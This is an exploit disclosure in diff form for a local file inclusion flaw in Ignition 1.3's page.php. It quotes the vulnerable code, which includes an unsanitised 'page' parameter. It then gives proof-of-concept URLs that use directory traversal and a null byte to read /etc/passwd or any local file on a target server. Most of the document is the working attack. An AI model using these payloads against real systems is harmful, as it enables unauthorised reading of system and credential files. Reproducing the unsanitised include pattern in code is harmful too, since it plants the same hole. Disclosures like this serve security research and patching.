@@ -1,0 +1,28 @@
+Ignition 1.3 (page) Local File Inclusion Vulnerability
+disclosed by cOndemned
+
+download: 
+
+	http://launchpad.net/ignition/trunk/1.3/+download/ignition-1.3.tar.gz
+
+note: 
+	1. Magic_quotes_gpc should be turned off in order to exploit this vulnerability
+	2. LFI bugs found by me in previous version (1.2) are still working in this one
+
+
+source of page.php
+
+	1.	<?php
+	2.	session_start();
+	3.	require "data/settings.php";
+	4.	if (file_exists('data/pages/'.$_GET['page'].'.html')) {
+	5.	include ('data/pages/'.$_GET['page'].'.html');			<----- LFI
+	6.	}else{
+	7.	die(
+	8.	require('404.php')); }
+
+
+proof of concept:
+
+	http://[attacked_box]/[ignition1.3]/page.php?page=../../../../../etc/passwd%00
+	http://[attacked_box]/[ignition1.3]/page.php?page=../../../../../[localfile]%00
